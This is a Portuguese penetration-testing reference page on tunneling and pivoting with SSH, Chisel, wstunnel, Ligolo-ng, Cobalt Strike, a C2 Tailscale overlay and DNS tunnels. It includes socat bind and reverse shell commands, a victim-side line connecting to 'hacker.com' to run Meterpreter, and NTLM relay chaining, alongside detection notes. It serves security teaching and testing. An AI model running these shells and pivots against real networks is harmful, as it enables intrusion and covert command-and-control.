# Tunelamento e encaminhamento de portas

{{#include ../banners/hacktricks-training.md}}

## Dica do Nmap

> [!WARNING]
> O suporte a proxy do Nmap é limitado a conexões TCP e não afeta varreduras de ping, portas ou detecção de SO. Quando o scanner está atrás de um proxy SOCKS, **desative a descoberta de hosts** (`-Pn`) e use uma **varredura de conexão TCP** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

O comando final usa as opções `-u` e `-i` do Evil-WinRM para identificar a conta e o host WinRM; a porta padrão do WinRM é 5985.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

O OpenSSH pode encaminhar conexões X11, portas TCP arbitrárias e sockets de domínio Unix pelo seu canal criptografado.<sup>[[6]](#references)</sup>

Conexão gráfica SSH (X)

`-Y` habilita o encaminhamento confiável de X11 e `-C` solicita a compressão dos dados encaminhados.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

Abrir uma nova porta no servidor SSH --> Outra porta

O encaminhamento remoto (`-R`) escuta no servidor SSH e se conecta ao lado local; o endereço de bind explícito controla quais interfaces podem acessar esse listener.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Porta local --> Host comprometido (SSH) --> Third_box:Port

O encaminhamento local (`-L`) escuta no cliente e se conecta ao destino pelo lado do servidor SSH.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Porta local --> Host comprometido (SSH) --> Qualquer lugar

O encaminhamento dinâmico (`-D`) cria um listener SOCKS4/SOCKS5 local cujas conexões são abertas a partir do lado remoto.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Multi-hop com ProxyJump

`-J`/`ProxyJump` conecta-se ao alvo por meio de um ou mais hosts de salto separados por vírgulas. As opções de encaminhamento ainda pertencem à conexão SSH final, então o listener SOCKS abaixo abre destinos a partir de `internal-target`, não do primeiro bastion. Isso evita fazer login em um host de salto e iniciar um segundo cliente SSH nele.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

As opções específicas do host para máquinas de salto devem ser colocadas em `~/.ssh/config`; a configuração da linha de comando destinada ao destino não é aplicada automaticamente aos hosts intermediários.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Isso é útil para obter reverse shells de hosts internos através de uma DMZ até o seu host:

A configuração `GatewayPorts` do servidor controla se um forward remoto pode fazer bind além do loopback; o padrão é `no`.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

Este exemplo baseado em root cria dispositivos de túnel em ambos os hosts. O servidor deve permitir o encaminhamento tun, e a conta selecionada deve ter acesso ao dispositivo tun; `PermitRootLogin yes` é uma forma de usar a conta `root` neste caso.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Ativar o encaminhamento no lado do servidor

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Defina uma nova rota no lado do cliente

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Segurança – Ataque Terrapin (CVE-2023-48795)**  
> O OpenSSH 9.6 adicionou uma extensão strict-KEX para combater o ataque de integridade no início do transporte do Terrapin. Sempre que possível, atualize ambos os pares e siga as orientações do fornecedor para implementações mais antigas, em vez de presumir que um canal encaminhado está protegido apenas pela versão.<sup>[[8]](#references)</sup>

## SSHUTTLE

Você pode criar um **túnel** via **ssh** para todo o **tráfego** destinado a uma **sub-rede**, passando por um host.\
Por exemplo, encaminhar todo o tráfego destinado a 10.10.10.0/24

`sshuttle` fornece proxy transparente por SSH e permite selecionar sub-redes e um comando SSH personalizado, conforme mostrado abaixo.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Conectar com uma chave privada

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

O `portfwd` do Metasploit oferece encaminhamento local e remoto, enquanto o módulo de proxy SOCKS foi projetado para funcionar com rotas de sessão ou `autoroute` e, nestes exemplos, escuta na porta 1080 por padrão.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Porta local --> Host comprometido (sessão ativa) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Outra maneira:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

O Beacon do Cobalt Strike pode retransmitir conexões SOCKS4a/SOCKS5 por meio de um Beacon; `rportfwd` faz bind no host comprometido, enquanto `rportfwd_local` inicia a conexão com o destino a partir do cliente Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>

### Proxy SOCKS

Abra uma porta no Team Server nas interfaces que devem encaminhar o tráfego pelo Beacon.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> Neste caso, a **porta é aberta no host do Beacon**, não no Team Server, e o tráfego é enviado ao Team Server e, de lá, ao host:porta indicado.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

O manual de reverse forwarding observa o seguinte comportamento:<sup>[[14]](#references)</sup>

- O reverse port forward do Beacon foi projetado para **tunelar tráfego para o Team Server, não para retransmitir tráfego entre máquinas individuais**.
- O tráfego é **tunelado dentro do tráfego C2 do Beacon**, incluindo links P2P.
- Portas altas geralmente evitam restrições de portas privilegiadas, mas as políticas do SO de destino e os listeners existentes ainda se aplicam.

### rPort2Port local

> [!WARNING]
> Neste caso, a **porta é aberta no host do Beacon**, não no Team Server, e o **tráfego é enviado ao cliente Cobalt Strike** (não ao Team Server) e, de lá, ao host:porta indicado.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## BOFScale - tailnet em processo protegido por CDN

[BOFScale](https://github.com/NetSPI/BOFscale) executa um overlay Tailscale modificado dentro de um implante C2 do Windows sem instalar um driver ou serviço TUN. Seus três componentes são um BOF-PE `tailscaled` `c-shared` assíncrono em CGo, um pequeno BOF-PE em C++ que se comunica com a API local e uma ponte TCP-para-SOCKS5 assíncrona `socksportfwd`.<sup>[[53]](#references)[[54]](#references)</sup>

### TS2021 e DERP compatíveis com CDN

O Tailscale normalmente usa upgrades HTTP proprietários para o canal de controle TS2021 baseado em Noise e para o relay DERP. O BOFScale mantém esses fluxos de bytes, mas os transporta em WebSockets RFC 6455, usando `Sec-WebSocket-Protocol: ts2021` ou `derp`, permitindo que uma origem Headscale/DERP controlada pelo operador fique atrás de uma CDN que aceita apenas upgrades WebSocket padrão. O cliente com patches tenta novamente o TS2021 por WebSockets após um HTTP `500`, tenta novamente o DERP após um HTTP `426` e faz com que o discador WebSocket DERP respeite a configuração de proxy do host; o BOF define `TS_DEBUG_DERP_WS_CLIENT=1` para ignorar a primeira tentativa, que sabidamente falha.<sup>[[53]](#references)[[54]](#references)</sup>

A CDN e o proxy de origem precisam preservar os upgrades WebSocket para `/ts2021` e `/derp`, encaminhar `/key` como HTTP comum e desativar os timeouts internos de leitura/gravação, pois as sessões de relay podem permanecer abertas indefinidamente. A configuração fornecida do Headscale habilita `verify_clients`, publica apenas o mapa DERP incorporado do operador e deixa `derp.urls` vazio para impedir o fallback para relays operados pelo Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

### Daemon em processo e controle por named pipe

A menos que seja substituído, o ponto de entrada do BOF inicia `tailscaled` com `-tun=userspace-networking`, `-state mem:` e `-no-logs-no-support`, e então cria um pipe com nome UUID. Ele redireciona stdout/stderr do Go por um pipe do SO para a API de saída do Beacon, de modo que o daemon completo e o runtime do Go permaneçam residentes, mas o estado e os logs não sejam gravados em um diretório do Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

O cliente leve reproduz a API local HTTP/1.0 do Tailscale por esse pipe. Ele abre o pipe com `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION`, pois a camada `safesocket` do daemon personifica o cliente do pipe, envia `Tailscale-Cap: 125` e mapeia a API local para operações de ativação (`up`), desativação (`down`), status (`status`), anúncio de rotas e encerramento.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Não descarregue um BOF-PE Go mapeado manualmente depois de solicitar o encerramento do daemon: goroutines do runtime e do garbage collector podem continuar executando em memória que o loader desmapeia. Execute `tailscaled` em um processo descartável e encerre esse processo para a limpeza final.<sup>[[54]](#references)</sup>

### Encaminhar tráfego originado no host por SOCKS5 em espaço de usuário

As conexões de entrada do tailnet e as rotas de sub-rede anunciadas funcionam dentro da pilha de rede em espaço de usuário, mas os processos normais no host comprometido não têm uma rota do SO para o overlay. Por isso, `socksportfwd` escuta em uma porta TCP acessível pela vítima, negocia SOCKS5 `NO AUTH` com o listener `0.0.0.0:1080` do daemon, envia `CONNECT` para um destino do tailnet e retransmite dados nos dois sentidos de forma assíncrona. Quando o destino é um nome MagicDNS, ele usa `ATYP_DOMAIN`, fazendo com que `tailscaled` resolva o nome sem expô-lo ao resolvedor do Windows.<sup>[[53]](#references)[[54]](#references)</sup>

Um fluxo mínimo para o operador é mostrado abaixo; tanto o nó do operador quanto o implante precisam usar os binários com patches, pois o Tailscale padrão não consegue atravessar essa configuração de CDN.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

O encaminhamento local pode separar o listener de autenticação aparente da ferramenta de relay: force uma máquina a autenticar-se na porta vinculada do host comprometido, encaminhe o tráfego pela tailnet até `ntlmrelayx` e faça relay para AD CS, LDAP, HTTP, SMB ou outro destino compatível. Consulte [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) e [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) para as etapas específicas da vulnerabilidade; BOFScale é apenas o transporte.<sup>[[54]](#references)</sup>

### Detecção

Procure a combinação, em vez de um único indicador fraco: um runtime Go em um processo que normalmente não usa Go, um pipe UUID com SDDL permissivo `D:(A;;GA;;;WD)`, um listener SOCKS inesperado em `0.0.0.0:1080` e WebSockets TLS persistentes para endereços de CDN. Com inspeção TLS, sinalize `Sec-WebSocket-Protocol: derp` ou `ts2021` quando o processo proprietário não for um serviço `tailscaled` autorizado. As regras `bofscale.yar` do repositório fornecem assinaturas de memória para os três componentes BOF-PE.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

O projeto fornece endpoints de web tunnel, como `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` e `tunnel.php`; carregue um endpoint compatível antes de iniciar o proxy local.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

Você pode baixá-lo na página de releases de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
O Chisel transporta tráfego TCP/UDP por HTTP usando uma conexão protegida por SSH; use builds compatíveis de cliente/servidor e verifique a sintaxe de comando da release selecionada.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) transporta forwards estáticos ou dinâmicos por WebSocket, HTTP/2 ou WebTransport (HTTP/3 sobre QUIC). As versões atuais oferecem suporte a TCP, UDP, Unix sockets, stdio, SOCKS5, proxy HTTP e listeners de proxy transparente no Linux, nos modos forward e reverse.<sup>[[52]](#references)</sup>

### Pivot SOCKS5 reverso

Execute o servidor no atacante e faça o pivot conectar-se de saída usando `-R`. Nessa direção, o listener SOCKS5 é criado no **servidor**, enquanto as conexões solicitadas têm origem na rede do **cliente/pivot**.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Um reverse static forward usa a mesma direção. Por exemplo, o seguinte expõe `10.10.10.20:445`, conforme acessado pelo pivot, na porta `8445` do loopback do atacante:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Detalhes de saída e transporte

- Adicione `-p http://user:pass@proxy:8080` ao client para atravessar um proxy HTTP explícito. Use `socks5h://127.0.0.1:1080` em clients como `curl` (ou habilite o DNS via proxy na aplicação) para que os nomes internos sejam resolvidos além do tunnel, em vez de vazarem para o resolver local.<sup>[[52]](#references)</sup>
- `wss://` seleciona WebSocket protegido por TLS. Um client `https://` seleciona HTTP/2, mas o buffering ou a conversão para HTTP/1 por reverse proxies/CDNs costuma interromper o stream bidirecional; exponha o servidor wstunnel diretamente ao testar esse modo.<sup>[[52]](#references)</sup>
- `wts://` seleciona WebTransport sobre QUIC. Inicie o servidor com `--enable-webtransport` (ou uma URL de escuta `wts://`) e permita UDP na porta de escuta. Esse modo não pode atravessar um proxy HTTP `CONNECT` convencional, pois esse proxy transporta TCP.<sup>[[52]](#references)</sup>

> [!WARNING]
> O projeto upstream alerta para não tratar o certificado autoassinado incorporado como proteção de privacidade. Prefira um certificado personalizado válido com `--tls-verify-certificate` (ou mTLS), mantenha os listeners do proxy em loopback, a menos que o acesso remoto seja intencional, e faça tunneling de protocolos já seguros quando a confidencialidade for importante.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

O guia rápido do Ligolo-ng documenta uma interface TUN no proxy, validação da impressão digital do certificado do agent e configuração de rotas para a rede tunelada.<sup>[[17]](#references)</sup>

### Tunelamento

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Vinculação e escuta do Agent

O Ligolo-ng pode adicionar listeners no agent que encaminham para um endereço no lado do proxy, e o intervalo reservado `240.0.0.0/4` pode ser roteado para acessar serviços locais do agent.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Acessar as portas locais do Agent

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

O Rpivot inicia o túnel reverso a partir da vítima e expõe um proxy SOCKS4 no endereço de loopback do atacante; o README também documenta credenciais de proxy NTLM e opções de hash.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot através de **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

O Socat combina tipos de endereço como `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` e `PROXY`; os exemplos abaixo combinam esses endpoints documentados.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port por meio de socks

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter via SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Você pode atravessar um **proxy não autenticado** com o tipo de endereço `PROXY` documentado pelo socat, executando esta linha em vez da última no console da vítima.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Túnel SSL do Socat

**/bin/sh console**

Crie certificados em ambos os lados: Client e Server

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Conecte a porta SSH local (22) à porta 443 do host do atacante.

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink é a ferramenta de conexão por linha de comando do PuTTY, com opções de encaminhamento SSH semelhantes às do `ssh`.<sup>[[22]](#references)</sup>

Use `-P` maiúsculo para a porta SSH. `-pw` é mantido por compatibilidade, mas expõe a senha na lista de processos; prefira a autenticação por chave ou `-pwfile` quando possível.<sup>[[22]](#references)[[23]](#references)</sup>

Como esse binário será executado na vítima e é um cliente SSH, abra o serviço e a porta SSH para a conexão reversa; o exemplo a seguir usa `-R` para encaminhar uma porta acessível localmente para a máquina do atacante.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Use um contexto com as permissões exigidas pelo host ao criar ou alterar regras persistentes de `portproxy`. A Microsoft documenta os formatos `v4tov4` de adição, exibição e exclusão usados abaixo.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### Implantando `portproxy` por meio de uma tarefa agendada

Quando credenciais administrativas estão disponíveis, a execução remota do Agendador de Tarefas pode instalar uma regra nativa de encaminhamento sem enviar um relay dedicado. Por exemplo, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) pode fazer um pivot escutar na porta TCP/443 e retransmitir a conexão para um serviço SMB interno.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

A regra é persistente, então liste-a com `netsh interface portproxy show v4tov4` e remova-a explicitamente após os testes. Lembre-se de que `portproxy` apenas encaminha conexões; o firewall do host também precisa permitir a porta de escuta.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

Você precisa ter **acesso RDP ao sistema**.\
Baixe:

O SocksOverRDP usa Remote Desktop Dynamic Virtual Channels para transportar uma conexão SOCKS5 por uma sessão RDP existente; o plugin do cliente escuta em `127.0.0.1:1080`, enquanto o componente do servidor é executado no alvo RDP.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta ferramenta usa `Dynamic Virtual Channels` (`DVC`) do recurso Remote Desktop Service do Windows. O DVC é responsável por **tunelar pacotes pela conexão RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

No computador cliente, carregue **`SocksOverRDP-Plugin.dll`** desta forma:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Agora podemos **nos conectar** à **vítima** via **RDP** usando **`mstsc.exe`**, e devemos receber um **aviso** informando que o **plugin SocksOverRDP está habilitado** e que ele **escutará** em **127.0.0.1:1080**.

**Conecte-se** via **RDP** e faça upload do binário `SocksOverRDP-Server.exe` para a máquina da vítima e execute-o:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Agora, confirme na sua máquina (atacante) que a porta 1080 está em escuta:

```
netstat -antb | findstr 1080
```

Agora você pode usar o [**Proxifier**](https://www.proxifier.com/) para encaminhar o tráfego por essa porta.<sup>[[26]](#references)</sup>

### Busca por canais virtuais RDP

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) é outro túnel de canal virtual RDP; o nome padrão do canal é `rdp2tcp`, embora um operador possa escolher outro nome.<sup>[[56]](#references)</sup> A criação e o fechamento de canais são registrados em `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` como IDs de evento **132** e **148**. Procure por `rdp2tcp` e nomes de canal raros/aleatórios e, em seguida, compare-os com canais esperados, como `XPSRD`, `cliprdr` e `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>

## Encaminhar aplicativos GUI do Windows por proxy

Você pode configurar aplicativos GUI do Windows para navegar por um proxy usando o [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
Em **Profile -> Proxy Servers**, adicione o IP e a porta do servidor SOCKS.\
Em **Profile -> Proxification Rules**, adicione o nome do programa a ser encaminhado pelo proxy e as conexões com os IPs que deseja encaminhar; as regras do Proxifier podem corresponder a aplicativos, hosts de destino e portas.<sup>[[27]](#references)</sup>

## Criar um túnel por meio de um proxy NTLM

A ferramenta mencionada anteriormente, **Rpivot**, pode encaminhar o tráfego por meio de um proxy que autentica com NTLM. O **OpenVPN** também pode rotear o tráfego por meio de um proxy desse tipo quando configurado com um arquivo de autenticação e o método NTLMv2; isso é travessia de proxy, não um bypass da autenticação do proxy.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm autentica-se em proxies NTLM upstream, expõe listeners locais e pode mapear uma porta local do túnel para um serviço de destino; os clientes podem então usar essa porta local.<sup>[[29]](#references)</sup>\
Por exemplo, encaminhar a porta 443

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Agora, se você configurar, por exemplo, o serviço **SSH** na vítima para escutar na porta 443, poderá se conectar a ele pela porta 2222 do atacante.<sup>[[29]](#references)</sup>\
Você também pode usar um **meterpreter** que se conecta a localhost:443 enquanto o atacante escuta na porta 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) é o kit de ferramentas de proxy reverso .NET da Microsoft. Você pode encontrá-lo aqui: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

O Iodine cria um túnel IPv4 por meio de consultas DNS e usa interfaces TUN; a configuração documentada exige os privilégios necessários para criar essas interfaces em ambas as extremidades.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

O transporte DNS tem uma sobrecarga maior do que o TCP direto e normalmente é lento; você pode criar uma conexão SSH compactada por meio desse túnel usando:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Baixe-o aqui**](https://github.com/iagox86/dnscat2)**.**

